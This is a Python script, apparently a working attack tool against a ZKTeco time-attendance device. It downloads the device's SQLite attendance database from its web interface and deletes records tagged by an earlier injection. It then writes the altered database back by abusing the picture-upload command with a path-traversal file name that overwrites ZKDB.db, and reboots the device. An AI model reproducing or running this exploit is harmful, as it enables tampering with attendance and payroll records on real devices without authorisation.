#!/usr/bin/env python3
"""
ZK DELETE TEST - Run after injection
====================================
Deletes records where CREATE_ID='🆕 EM VỪA INJECT' from ZKDB.db and uploads.
"""
import sys, os, time, struct, sqlite3, urllib.request, gzip, shutil
sys.path.insert(0, r'D:\chamcong\AttendanceSuite_Portable\python\Lib\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

from zk import ZK
from struct import pack

DEVICE_IP = '172.16.0.214'
WEB_IP    = '172.16.254.202'
WORK_DIR  = r'D:\chamcong\zk_inject_workspace'
MARKER    = '🆕 EM VỪA INJECT'

def banner(msg): print('\n' + '=' * 70 + '\n' + msg + '\n' + '=' * 70)

def download_zkdb(web_ip, out_path):
    url = f'http://{web_ip}/form/DataApp?style=0'
    print(f'[*] Downloading {url} ...')
    with urllib.request.urlopen(url, timeout=60) as r:
        data = r.read()
    print(f'  Got {len(data)} bytes')
    gz = gzip.decompress(data[data.find(b'\x1f\x8b\x08'):])
    sq_off = gz.find(b'SQLite format 3')
    fsize = int(gz[:512][124:136].decode('ascii', errors='replace').strip('\x00'), 8)
    sq = gz[sq_off:sq_off + fsize]
    with open(out_path, 'wb') as f: f.write(sq)
    print(f'  Saved {len(sq)} bytes -> {out_path}')
    return sq

def send_cmd(conn, cmd, data=b''):
    try: return conn._ZK__send_command(cmd, data, response_size=1024)
    except Exception as e: return {'status': False, 'error': str(e)}

def upload_zkdb(conn, data, chunk_size=32768):
    fn = ('..' + chr(47)) * 7 + 'mnt/mtdblock/data/ZKDB.db'
    fn = fn.encode() + b'\x00'
    sz = len(data)
    print(f'[1/3] PREPARE_DATA size={sz}')
    r1 = send_cmd(conn, 1500, pack('I', sz))
    if not r1.get('status'): return {'error': 'PREPARE fail', 'r1': r1}
    packets = sz // chunk_size
    remain = sz % chunk_size
    t0 = time.time()
    fails = []
    for i in range(packets):
        r = send_cmd(conn, 1501, data[i*chunk_size:(i+1)*chunk_size])
        if not r.get('status'):
            fails.append(i)
            if len(fails) > 5: return {'error': 'too many fails', 'failed': fails}
        if (i+1) % 50 == 0: print(f'  ...{i+1}/{packets}')
    if remain: send_cmd(conn, 1501, data[packets*chunk_size:])
    el = time.time() - t0
    print(f'  Upload {el:.1f}s ({sz/el/1024:.1f} KB/s)')
    print('[3/3] UPLOAD_PICTURE commit')
    r3 = send_cmd(conn, 0x272B, fn)
    return {'PREPARE': r1, 'UPLOAD': r3, 'fails': fails, 'time': el}

def connect_with_retry(ip, timeout_s=60):
    """Connect with retry - device may still be rebooting"""
    for attempt in range(10):
        try:
            zk = ZK(ip, port=4370, timeout=10, password=0)
            c = zk.connect()
            print(f'  [+] Connected on attempt {attempt+1}')
            return c, zk
        except Exception as e:
            wait = 5 + attempt * 3
            print(f'  Attempt {attempt+1} failed: {e}. Waiting {wait}s ...')
            time.sleep(wait)
    return None, None

# ========== MAIN ==========
banner(f'ZK DELETE TEST | Marker: {MARKER}')

# Step 1: Get current ZKDB.db from web (now contains our injected record)
print('[*] Step 1: Download current ZKDB.db from Web UI ...')
db_path = os.path.join(WORK_DIR, 'before_delete_zkdb.db')
download_zkdb(WEB_IP, db_path)

# Step 2: Check what's in DB
db = sqlite3.connect(db_path); cur = db.cursor()
count = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
print(f'  Total ATTLOG: {count}')
marker_records = cur.execute('SELECT ID, User_PIN, Verify_Time, Status, CREATE_ID FROM ATT_LOG WHERE CREATE_ID=?', (MARKER,)).fetchall()
print(f'  Records with marker "{MARKER}": {len(marker_records)}')
for r in marker_records:
    print(f'    ID={r[0]} PIN={r[1]} Time={r[2]} Status={r[3]} CREATE_ID={r[4]}')

# Step 3: DELETE marker records
print(f'\n[*] Step 2: DELETE WHERE CREATE_ID="{MARKER}" ...')
before = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
cur.execute('DELETE FROM ATT_LOG WHERE CREATE_ID = ?', (MARKER,))
deleted = cur.rowcount
db.commit()
after = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
print(f'  Before: {before}, Deleted: {deleted}, After: {after}')
db.close()

# Step 4: Upload deleted ZKDB.db with retries
banner('STEP 3: Upload deleted ZKDB.db')
with open(db_path, 'rb') as f: modified = f.read()
print(f'  DB size: {len(modified)} bytes')

conn, zk = connect_with_retry(DEVICE_IP)
if conn:
    try: conn.disable_device()
    except: pass
    try:
        result = upload_zkdb(conn, modified)
        print(f'  Upload: {result}')
        print('[*] Rebooting ...')
        try: conn.restart()
        except: pass
        try: conn.disconnect()
        except: pass
    except Exception as e:
        print(f'  Upload err: {e}')
else:
    print('[!] Could not connect to device')

print('\n[*] Waiting 40s for reboot ...')
time.sleep(40)

# Step 5: Verify
banner('STEP 4: Verify delete')
conn2, zk2 = connect_with_retry(DEVICE_IP)
if conn2:
    print(f'  FW: {conn2.get_firmware_version()}')
    print(f'  Serial: {conn2.get_serialnumber()}')
    try:
        att = conn2.get_attendance()
        print(f'  Total ATTLOG now: {len(att)}')
        print(f'  Last 5 records:')
        for r in att[-5:]:
            print(f'    {r}')
        # Check for marker (CREATE_ID not in pyzk output but check user_id for marker)
        marker_found = any(MARKER in str(r) for r in att[-20:])
        if marker_found:
            print(f'\n  ⚠️ Marker STILL FOUND in recent records')
        else:
            print(f'\n  ✅ Marker NOT in last 20 records')
    except Exception as e:
        print(f'  ATTLOG err: {e}')
    try: conn2.disconnect()
    except: pass
else:
    print('[!] Could not reconnect')

print('\n[+] Done')